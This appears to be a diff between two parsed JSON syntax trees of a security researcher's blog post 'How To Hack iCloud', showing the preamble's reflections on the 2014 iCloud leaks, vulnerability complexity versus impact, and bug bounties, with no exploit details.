82c82
<       "type": "heading",
---
>       "type": "section",
86,570c86,87
<           "type": "text",
<           "value": "How To Hack iCloud {#how-to-hack-icloud}",
<           "position": {
<             "start": {
<               "line": 29,
<               "column": 1,
<               "offset": 611
<             },
<             "end": {
<               "line": 29,
<               "column": 41,
<               "offset": 651
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 29,
<           "column": 1,
<           "offset": 611
<         },
<         "end": {
<           "line": 30,
<           "column": 19,
<           "offset": 671
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "how to hack icloud",
<       "label": "How To Hack iCloud",
<       "title": null,
<       "url": "#how-to-hack-icloud",
<       "position": {
<         "start": {
<           "line": 32,
<           "column": 1,
<           "offset": 675
<         },
<         "end": {
<           "line": 32,
<           "column": 42,
<           "offset": 716
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§0",
<       "label": "§0",
<       "title": null,
<       "url": "#how-to-hack-icloud",
<       "position": {
<         "start": {
<           "line": 33,
<           "column": 1,
<           "offset": 718
<         },
<         "end": {
<           "line": 33,
<           "column": 26,
<           "offset": 743
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "Preamble {#preamble}",
<           "position": {
<             "start": {
<               "line": 35,
<               "column": 1,
<               "offset": 747
<             },
<             "end": {
<               "line": 35,
<               "column": 21,
<               "offset": 767
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 35,
<           "column": 1,
<           "offset": 747
<         },
<         "end": {
<           "line": 36,
<           "column": 21,
<           "offset": 789
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "§1",
<       "label": "§1",
<       "title": null,
<       "url": "#preamble",
<       "position": {
<         "start": {
<           "line": 38,
<           "column": 1,
<           "offset": 793
<         },
<         "end": {
<           "line": 38,
<           "column": 16,
<           "offset": 808
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "preamble",
<       "label": "Preamble",
<       "title": null,
<       "url": "#preamble",
<       "position": {
<         "start": {
<           "line": 39,
<           "column": 1,
<           "offset": 810
<         },
<         "end": {
<           "line": 39,
<           "column": 22,
<           "offset": 831
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The intersection of internet and identity is one with a long and fascinating\nhistory because it's imbued with so many ideals about how people's real lives\ninteract with their internet lives. Software and security architectures are\nalways created with a particular idea of technical morality which gets encoded\ninto the algorithms that underpin the systems themselves.",
<           "position": {
<             "start": {
<               "line": 41,
<               "column": 1,
<               "offset": 835
<             },
<             "end": {
<               "line": 45,
<               "column": 58,
<               "offset": 1206
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 41,
<           "column": 1,
<           "offset": 835
<         },
<         "end": {
<           "line": 45,
<           "column": 58,
<           "offset": 1206
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "One idea I tend to think about a lot when it comes to people and their\ninteraction with information security systems is one I've never been able to\nfind the source of. It may well be false or apocryphal but it sticks with me\nstill.",
<           "position": {
<             "start": {
<               "line": 47,
<               "column": 1,
<               "offset": 1210
<             },
<             "end": {
<               "line": 50,
<               "column": 7,
<               "offset": 1444
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 47,
<           "column": 1,
<           "offset": 1210
<         },
<         "end": {
<           "line": 50,
<           "column": 7,
<           "offset": 1444
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "It said the invention of Public Key Cryptography was due, at least in part to\nthe understanding that in the future, people would have ever more meaningful\nrelationships online. In a world before cryptography between individuals was a\nmeaningful thing, a relationship had online -- as friends or otherwise -- was a\nrelationship had in the open.",
<           "position": {
<             "start": {
<               "line": 52,
<               "column": 1,
<               "offset": 1448
<             },
<             "end": {
<               "line": 56,
<               "column": 30,
<               "offset": 1795
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 52,
<           "column": 1,
<           "offset": 1448
<         },
<         "end": {
<           "line": 56,
<           "column": 30,
<           "offset": 1795
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "One can absolutely debate forever about to what extent someone's representation\nof themselves on social media, or their favourite gaming platform is an\nindirect, curated representation of themselves but one thing that is for sure is\nthat whatever's in your iCloud is a pretty raw representation of self.",
<           "position": {
<             "start": {
<               "line": 58,
<               "column": 1,
<               "offset": 1799
<             },
<             "end": {
<               "line": 61,
<               "column": 71,
<               "offset": 2105
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 58,
<           "column": 1,
<           "offset": 1799
<         },
<         "end": {
<           "line": 61,
<           "column": 71,
<           "offset": 2105
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "That's fascinating to me. For most of the time I used the internet my email was\nfull of weird junk and my social media accounts had some platitudes about\nwhatever was funny online. The closest these profiles came to being 'real' was\nthe rare profile picture I might have of my face.",
<           "position": {
<             "start": {
<               "line": 63,
<               "column": 1,
<               "offset": 2109
<             },
<             "end": {
<               "line": 66,
<               "column": 50,
<               "offset": 2394
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 63,
<           "column": 1,
<           "offset": 2109
<         },
<         "end": {
<           "line": 66,
<           "column": 50,
<           "offset": 2394
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "If you hacked these accounts, or you got my computer you might mull over the\nnumber of image macros I had bookmarked, but you wouldn't really have much of an\nidea of what my life was like. Now I talk to all of my friends on a medium\nthat's recorded forever and I have every photo I ever took of my life and my\nrelationships back to 2014.",
<           "position": {
<             "start": {
<               "line": 68,
<               "column": 1,
<               "offset": 2398
<             },
<             "end": {
<               "line": 72,
<               "column": 28,
<               "offset": 2739
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 68,
<           "column": 1,
<           "offset": 2398
<         },
<         "end": {
<           "line": 72,
<           "column": 28,
<           "offset": 2739
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Often discussion of this comes with a heavy-handed sense of fear that such\nthings are 'online' but that's not something I fear, or what I'm trying to draw\nattention to. To me, what's fascinating is that someone's real life history and\nidentity is online at all, that between me and knowing everything about you are\na few security systems.",
<           "position": {
<             "start": {
<               "line": 74,
<               "column": 1,
<               "offset": 2743
<             },
<             "end": {
<               "line": 78,
<               "column": 24,
<               "offset": 3085
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 74,
<           "column": 1,
<           "offset": 2743
<         },
<         "end": {
<           "line": 78,
<           "column": 24,
<           "offset": 3085
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "When, in 2014 \"a collection of almost 500 private pictures of various celebrities, mostly women, and with many containing nudity, were posted on the imageboard 4chan ... initially believed to have been obtained via a breach of Apple's cloud services suite iCloud\" (",
<           "position": {
<             "start": {
<               "line": 80,
<               "column": 1,
<               "offset": 3089
<             },
<             "end": {
<               "line": 80,
<               "column": 266,
<               "offset": 3354
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "linkReference",
<           "identifier": "1",
<           "label": "1",
<           "referenceType": "full",
---
>           "type": "heading",
>           "depth": 1,
574c91
<               "value": "wiki",
---
>               "value": "How To Hack iCloud {#how-to-hack-icloud}",
577,579c94,96
<                   "line": 80,
<                   "column": 267,
<                   "offset": 3355
---
>                   "line": 29,
>                   "column": 1,
>                   "offset": 611
582,584c99,101
<                   "line": 80,
<                   "column": 271,
<                   "offset": 3359
---
>                   "line": 29,
>                   "column": 41,
>                   "offset": 651
592,664c109
<               "line": 80,
<               "column": 266,
<               "offset": 3354
<             },
<             "end": {
<               "line": 80,
<               "column": 275,
<               "offset": 3363
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ") -- I had this realisation that the people whose lives were 'online' weren't the people who sent sexts over MySpace chat anymore, it was everyone. Like hacking someone's 'Cyberbrain' in Ghost In The Shell, hacking someone's personal cloud storage was like peering directly into their life and seeing it from their eyes.",
<           "position": {
<             "start": {
<               "line": 80,
<               "column": 275,
<               "offset": 3363
<             },
<             "end": {
<               "line": 80,
<               "column": 595,
<               "offset": 3683
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 80,
<           "column": 1,
<           "offset": 3089
<         },
<         "end": {
<           "line": 80,
<           "column": 595,
<           "offset": 3683
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "1",
<       "label": "1",
<       "title": null,
<       "url": "https://en.wikipedia.org/wiki/ICloud_leaks_of_celebrity_photos",
<       "position": {
<         "start": {
<           "line": 82,
<           "column": 1,
<           "offset": 3687
<         },
<         "end": {
<           "line": 82,
<           "column": 68,
<           "offset": 3754
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "In this article I'll be describing and demonstrating to the best of my ability a\nnow patched series of exploits on the Apple identity systems idmsa.apple.com.",
<           "position": {
<             "start": {
<               "line": 84,
---
>               "line": 29,
666c111
<               "offset": 3758
---
>               "offset": 611
669,671c114,116
<               "line": 85,
<               "column": 78,
<               "offset": 3917
---
>               "line": 30,
>               "column": 19,
>               "offset": 671
677,683d121
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 84,
<           "column": 1,
<           "offset": 3758
685,697d122
<         "end": {
<           "line": 85,
<           "column": 78,
<           "offset": 3917
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
699,700c124,128
<           "type": "text",
<           "value": "There's a particular framework in which I want such issues to be understood,\nthough. It's an angle on my understanding of the context of issues I find that\nI've thought a lot about, but never tried to write down before.",
---
>           "type": "definition",
>           "identifier": "how to hack icloud",
>           "label": "How To Hack iCloud",
>           "title": null,
>           "url": "#how-to-hack-icloud",
703c131
<               "line": 87,
---
>               "line": 32,
705c133
<               "offset": 3921
---
>               "offset": 675
708,710c136,138
<               "line": 89,
<               "column": 64,
<               "offset": 4142
---
>               "line": 32,
>               "column": 42,
>               "offset": 716
712,715c140
<             "indent": [
<               1,
<               1
<             ]
---
>             "indent": []
717,728d141
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 87,
<           "column": 1,
<           "offset": 3921
<         },
<         "end": {
<           "line": 89,
<           "column": 64,
<           "offset": 4142
730,738d142
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
740,741c144,148
<           "type": "text",
<           "value": "Over the years as I've grown and matured the stuff I've hacked has only grown in\nimpact. Consider, for example my ",
---
>           "type": "definition",
>           "identifier": "§0",
>           "label": "§0",
>           "title": null,
>           "url": "#how-to-hack-icloud",
744c151
<               "line": 91,
---
>               "line": 33,
746c153
<               "offset": 4146
---
>               "offset": 718
749,751c156,158
<               "line": 92,
<               "column": 34,
<               "offset": 4261
---
>               "line": 33,
>               "column": 26,
>               "offset": 743
753,755c160
<             "indent": [
<               1
<             ]
---
>             "indent": []
759,762c164,165
<           "type": "linkReference",
<           "identifier": "2",
<           "label": "2",
<           "referenceType": "full",
---
>           "type": "section",
>           "depth": 2,
765,766c168,188
<               "type": "text",
<               "value": "2017 hack of a nation's tax system",
---
>               "type": "heading",
>               "depth": 2,
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "Preamble {#preamble}",
>                   "position": {
>                     "start": {
>                       "line": 35,
>                       "column": 1,
>                       "offset": 747
>                     },
>                     "end": {
>                       "line": 35,
>                       "column": 21,
>                       "offset": 767
>                     },
>                     "indent": []
>                   }
>                 }
>               ],
769,771c191,193
<                   "line": 92,
<                   "column": 35,
<                   "offset": 4262
---
>                   "line": 35,
>                   "column": 1,
>                   "offset": 747
774,776c196,198
<                   "line": 92,
<                   "column": 69,
<                   "offset": 4296
---
>                   "line": 36,
>                   "column": 21,
>                   "offset": 789
778c200,202
<                 "indent": []
---
>                 "indent": [
>                   1
>                 ]
780,808d203
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 92,
<               "column": 34,
<               "offset": 4261
<             },
<             "end": {
<               "line": 92,
<               "column": 73,
<               "offset": 4300
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". When\npeople hear about this stuff, the first thing they think is 'oh no! what if it\nhappened to me'. And they think about how ",
<           "position": {
<             "start": {
<               "line": 92,
<               "column": 73,
<               "offset": 4300
<             },
<             "end": {
<               "line": 94,
<               "column": 43,
<               "offset": 4430
810,818d204
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
820,821c206,210
<               "type": "text",
<               "value": "bad",
---
>               "type": "definition",
>               "identifier": "§1",
>               "label": "§1",
>               "title": null,
>               "url": "#preamble",
824,826c213,215
<                   "line": 94,
<                   "column": 44,
<                   "offset": 4431
---
>                   "line": 38,
>                   "column": 1,
>                   "offset": 793
829,831c218,220
<                   "line": 94,
<                   "column": 47,
<                   "offset": 4434
---
>                   "line": 38,
>                   "column": 16,
>                   "offset": 808
835,917d223
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 94,
<               "column": 43,
<               "offset": 4430
<             },
<             "end": {
<               "line": 94,
<               "column": 48,
<               "offset": 4435
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " security must be to get there.",
<           "position": {
<             "start": {
<               "line": 94,
<               "column": 48,
<               "offset": 4435
<             },
<             "end": {
<               "line": 94,
<               "column": 79,
<               "offset": 4466
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 91,
<           "column": 1,
<           "offset": 4146
<         },
<         "end": {
<           "line": 94,
<           "column": 79,
<           "offset": 4466
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "2",
<       "label": "2",
<       "title": null,
<       "url": "https://medium.com/@Zemnmez/how-to-hack-the-uk-tax-system-i-guess-3e84b70f8b",
<       "position": {
<         "start": {
<           "line": 96,
<           "column": 1,
<           "offset": 4470
<         },
<         "end": {
<           "line": 96,
<           "column": 82,
<           "offset": 4551
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "That's something that I think is maybe even harmful to the general public's\nunderstanding of security. It puts all vulnerabilities on the same table. In\nreality, I see vulnerabilities as running along this asymtotic curve of\n",
<           "position": {
<             "start": {
<               "line": 98,
<               "column": 1,
<               "offset": 4555
919,933d224
<             "end": {
<               "line": 101,
<               "column": 1,
<               "offset": 4783
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
935,936c226,230
<               "type": "text",
<               "value": "complexity",
---
>               "type": "definition",
>               "identifier": "preamble",
>               "label": "Preamble",
>               "title": null,
>               "url": "#preamble",
939,941c233,235
<                   "line": 101,
<                   "column": 2,
<                   "offset": 4784
---
>                   "line": 39,
>                   "column": 1,
>                   "offset": 810
944,946c238,240
<                   "line": 101,
<                   "column": 12,
<                   "offset": 4794
---
>                   "line": 39,
>                   "column": 22,
>                   "offset": 831
950,978d243
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 101,
<               "column": 1,
<               "offset": 4783
<             },
<             "end": {
<               "line": 101,
<               "column": 13,
<               "offset": 4795
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " vs ",
<           "position": {
<             "start": {
<               "line": 101,
<               "column": 13,
<               "offset": 4795
<             },
<             "end": {
<               "line": 101,
<               "column": 17,
<               "offset": 4799
980,985d244
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
987,988c246,270
<               "type": "text",
<               "value": "impact",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "The intersection of internet and identity is one with a long and fascinating\nhistory because it's imbued with so many ideals about how people's real lives\ninteract with their internet lives. Software and security architectures are\nalways created with a particular idea of technical morality which gets encoded\ninto the algorithms that underpin the systems themselves.",
>                   "position": {
>                     "start": {
>                       "line": 41,
>                       "column": 1,
>                       "offset": 835
>                     },
>                     "end": {
>                       "line": 45,
>                       "column": 58,
>                       "offset": 1206
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
991,993c273,275
<                   "line": 101,
<                   "column": 18,
<                   "offset": 4800
---
>                   "line": 41,
>                   "column": 1,
>                   "offset": 835
996,998c278,280
<                   "line": 101,
<                   "column": 24,
<                   "offset": 4806
---
>                   "line": 45,
>                   "column": 58,
>                   "offset": 1206
1000c282,287
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
1002,1072d288
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 101,
<               "column": 17,
<               "offset": 4799
<             },
<             "end": {
<               "line": 101,
<               "column": 25,
<               "offset": 4807
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ". It's the landscape representing all the bugs that are\nout there.",
<           "position": {
<             "start": {
<               "line": 101,
<               "column": 25,
<               "offset": 4807
<             },
<             "end": {
<               "line": 102,
<               "column": 11,
<               "offset": 4874
<             },
<             "indent": [
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 98,
<           "column": 1,
<           "offset": 4555
<         },
<         "end": {
<           "line": 102,
<           "column": 11,
<           "offset": 4874
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The more complicated a security bug is, the less likely it is to be discovered,\nbut also the more likely it is to be really dangerous if found. There's\nliterally hundreds if not thousands of extremely high complexity security\nvulnerabilities in any system, software or otherwise. But the reason that all\nour shit doesn't fall apart is because high complexity means ",
<           "position": {
<             "start": {
<               "line": 104,
<               "column": 1,
<               "offset": 4878
<             },
<             "end": {
<               "line": 108,
<               "column": 62,
<               "offset": 5247
1074,1084d289
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
1086,1087c291,314
<               "type": "text",
<               "value": "difficult to\nfind",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "One idea I tend to think about a lot when it comes to people and their\ninteraction with information security systems is one I've never been able to\nfind the source of. It may well be false or apocryphal but it sticks with me\nstill.",
>                   "position": {
>                     "start": {
>                       "line": 47,
>                       "column": 1,
>                       "offset": 1210
>                     },
>                     "end": {
>                       "line": 50,
>                       "column": 7,
>                       "offset": 1444
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
1090,1092c317,319
<                   "line": 108,
<                   "column": 63,
<                   "offset": 5248
---
>                   "line": 47,
>                   "column": 1,
>                   "offset": 1210
1095,1097c322,324
<                   "line": 109,
<                   "column": 5,
<                   "offset": 5266
---
>                   "line": 50,
>                   "column": 7,
>                   "offset": 1444
1099a327,328
>                   1,
>                   1,
1103,1301d331
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 108,
<               "column": 62,
<               "offset": 5247
<             },
<             "end": {
<               "line": 109,
<               "column": 6,
<               "offset": 5267
<             },
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 109,
<               "column": 6,
<               "offset": 5267
<             },
<             "end": {
<               "line": 109,
<               "column": 7,
<               "offset": 5268
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 104,
<           "column": 1,
<           "offset": 4878
<         },
<         "end": {
<           "line": 109,
<           "column": 7,
<           "offset": 5268
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This puts the bugs I find in a fairly uncomfortable place. Sure, the bugs are\nreally impactful, and really bad on the surface but the fact that they exist\ndoesn't necessarily indicate a severe flaw in the underlying security system.",
<           "position": {
<             "start": {
<               "line": 111,
<               "column": 1,
<               "offset": 5272
<             },
<             "end": {
<               "line": 113,
<               "column": 78,
<               "offset": 5506
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 111,
<           "column": 1,
<           "offset": 5272
<         },
<         "end": {
<           "line": 113,
<           "column": 78,
<           "offset": 5506
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "That doesn't mean the bugs weren't worth finding either -- really complicated\nbugs are the kind that might one day absolutely ruin you if put in the hands of\nsome wealthy organized crime syndicate that bought it at auction or an\nauthoritarian state actor you've crossed.",
<           "position": {
<             "start": {
<               "line": 115,
<               "column": 1,
<               "offset": 5510
<             },
<             "end": {
<               "line": 118,
<               "column": 42,
<               "offset": 5783
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 115,
<           "column": 1,
<           "offset": 5510
<         },
<         "end": {
<           "line": 118,
<           "column": 42,
<           "offset": 5783
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "My heavily laboured point is that it's important to differentiate security\nissues that need to get written by someone who is likely already an industry\nprofessional versus bugs that can be dug up by anyone pasting from the 'XSS\nEvasion Cheat Sheet'.",
<           "position": {
<             "start": {
<               "line": 120,
<               "column": 1,
<               "offset": 5787
<             },
<             "end": {
<               "line": 123,
<               "column": 22,
<               "offset": 6039
<             },
<             "indent": [
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 120,
<           "column": 1,
<           "offset": 5787
<         },
<         "end": {
<           "line": 123,
<           "column": 22,
<           "offset": 6039
<         },
<         "indent": [
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "The former is much scarier ",
<           "position": {
<             "start": {
<               "line": 125,
<               "column": 1,
<               "offset": 6043
<             },
<             "end": {
<               "line": 125,
<               "column": 28,
<               "offset": 6070
1303,1308d332
<             "indent": []
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
1310,1311c334,358
<               "type": "text",
<               "value": "when found",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "It said the invention of Public Key Cryptography was due, at least in part to\nthe understanding that in the future, people would have ever more meaningful\nrelationships online. In a world before cryptography between individuals was a\nmeaningful thing, a relationship had online -- as friends or otherwise -- was a\nrelationship had in the open.",
>                   "position": {
>                     "start": {
>                       "line": 52,
>                       "column": 1,
>                       "offset": 1448
>                     },
>                     "end": {
>                       "line": 56,
>                       "column": 30,
>                       "offset": 1795
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
1314,1316c361,363
<                   "line": 125,
<                   "column": 29,
<                   "offset": 6071
---
>                   "line": 52,
>                   "column": 1,
>                   "offset": 1448
1319,1321c366,368
<                   "line": 125,
<                   "column": 39,
<                   "offset": 6081
---
>                   "line": 56,
>                   "column": 30,
>                   "offset": 1795
1323c370,375
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
1325,1331d376
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 125,
<               "column": 28,
<               "offset": 6070
1333,1363d377
<             "end": {
<               "line": 125,
<               "column": 40,
<               "offset": 6082
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " than the latter, but the latter is much\nscarier in general because it's far, far more likely to happen in a malicious\ncontext. ",
<           "position": {
<             "start": {
<               "line": 125,
<               "column": 40,
<               "offset": 6082
<             },
<             "end": {
<               "line": 127,
<               "column": 10,
<               "offset": 6212
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         },
<         {
<           "type": "emphasis",
<           "children": [
1365,1366c379,402
<               "type": "text",
<               "value": "HeartBleed",
---
>               "type": "paragraph",
>               "children": [
>                 {
>                   "type": "text",
>                   "value": "One can absolutely debate forever about to what extent someone's representation\nof themselves on social media, or their favourite gaming platform is an\nindirect, curated representation of themselves but one thing that is for sure is\nthat whatever's in your iCloud is a pretty raw representation of self.",
>                   "position": {
>                     "start": {
>                       "line": 58,
>                       "column": 1,
>                       "offset": 1799
>                     },
>                     "end": {
>                       "line": 61,
>                       "column": 71,
>                       "offset": 2105
>                     },
>                     "indent": [
>                       1,
>                       1,
>                       1
>                     ]
>                   }
>                 }
>               ],
1369,1371c405,407
<                   "line": 127,
<                   "column": 11,
<                   "offset": 6213
---
>                   "line": 58,
>                   "column": 1,
>                   "offset": 1799
1374,1376c410,412
<                   "line": 127,
<                   "column": 21,
<                   "offset": 6223
---
>                   "line": 61,
>                   "column": 71,
>                   "offset": 2105
1378c414,418
<                 "indent": []
---
>                 "indent": [
>                   1,
>                   1,
>                   1
>                 ]
1380,1757d419
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 127,
<               "column": 10,
<               "offset": 6212
<             },
<             "end": {
<               "line": 127,
<               "column": 22,
<               "offset": 6224
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": " is a terrifying bug. But bug categories need to be worried\nabout versus their likelihood of happening. If we drop the whole security budget\non preventing the next HeartBleed by porting all our systems to SELinux, a 16\nyear old HackForums reader named 'm4rshv1perX' is going to XSS our admins and\ndump our SQL database online.",
<           "position": {
<             "start": {
<               "line": 127,
<               "column": 22,
<               "offset": 6224
<             },
<             "end": {
<               "line": 131,
<               "column": 30,
<               "offset": 6554
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 125,
<           "column": 1,
<           "offset": 6043
<         },
<         "end": {
<           "line": 131,
<           "column": 30,
<           "offset": 6554
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Though bug bounties are currently fodder for 10,000 medium severity issues on\nstaging.john.production.com this is what I always saw bug bounties and\nvulnerability disclosure as perfect for: scooping up the vulnerabilities\nproduced by people who just happen to have some special research that breaches\nthat area of high complication.",
<           "position": {
<             "start": {
<               "line": 133,
<               "column": 1,
<               "offset": 6558
<             },
<             "end": {
<               "line": 137,
<               "column": 32,
<               "offset": 6894
<             },
<             "indent": [
<               1,
<               1,
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 133,
<           "column": 1,
<           "offset": 6558
<         },
<         "end": {
<           "line": 137,
<           "column": 32,
<           "offset": 6894
<         },
<         "indent": [
<           1,
<           1,
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "Just a few minutes attention from some Project Zero guys is worth tens of\nthousands of dollars if I could only tempt them with my fine selection of bounty\nshirts and glass tumblers with company logos.",
<           "position": {
<             "start": {
<               "line": 139,
<               "column": 1,
<               "offset": 6898
<             },
<             "end": {
<               "line": 141,
<               "column": 46,
<               "offset": 7100
<             },
<             "indent": [
<               1,
<               1
<             ]
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 139,
<           "column": 1,
<           "offset": 6898
<         },
<         "end": {
<           "line": 141,
<           "column": 46,
<           "offset": 7100
<         },
<         "indent": [
<           1,
<           1
<         ]
<       }
<     },
<     {
<       "type": "heading",
<       "depth": 2,
<       "children": [
<         {
<           "type": "text",
<           "value": "II. The Very Worst Thing {#the_very_worst_thing}",
<           "position": {
<             "start": {
<               "line": 143,
<               "column": 1,
<               "offset": 7104
<             },
<             "end": {
<               "line": 143,
<               "column": 49,
<               "offset": 7152
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 143,
<           "column": 1,
<           "offset": 7104
<         },
<         "end": {
<           "line": 144,
<           "column": 45,
<           "offset": 7198
<         },
<         "indent": [
<           1
<         ]
<       }
<     },
<     {
<       "type": "definition",
<       "identifier": "the very worst thing",
<       "label": "The Very Worst Thing",
<       "title": null,
<       "url": "#the_very_worst_thing",
<       "position": {
<         "start": {
<           "line": 146,
<           "column": 1,
<           "offset": 7202
<         },
<         "end": {
<           "line": 146,
<           "column": 46,
<           "offset": 7247
<         },
<         "indent": []
